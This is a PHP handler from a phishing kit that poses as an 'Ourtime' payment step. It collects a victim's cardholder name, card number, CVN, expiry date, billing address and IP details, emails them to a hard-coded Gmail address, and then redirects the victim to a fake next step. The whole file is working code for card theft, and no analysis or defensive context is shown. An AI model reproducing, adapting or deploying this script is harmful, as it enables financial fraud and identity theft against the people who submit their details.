<?php
if($_POST["name"] != "" and $_POST["cn"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Ourtime Info-----------------------\n";
$message .= "|Card Holder Name : ".$_POST['name']."\n";
$message .= "|Credit card Number : ".$_POST['cn']."\n";
$message .= "|CVN : ".$_POST['cv']."\n";
$message .= "|Expiry Date  : ".$_POST['exp1'].'/'.$_POST['exp2']."\n";
$message .= "|Billing Address : ".$_POST['address1'].'/'.$_POST['address2']."\n";
$message .= "|City / Town : ".$_POST['city']."\n";
$message .= "|Country : ".$_POST['country']."\n";
$message .= "|State : ".$_POST['state']."\n";
$message .= "|Zip Code : ".$_POST['zip']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "ashafa08@gmail.com";
$subject = "Ashaface Card | $ip";
{
mail("$send", "$subject", $message);   
}
$praga=rand();
$praga=md5($praga);
  header ("Location: step3.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: index.php");
}

?>
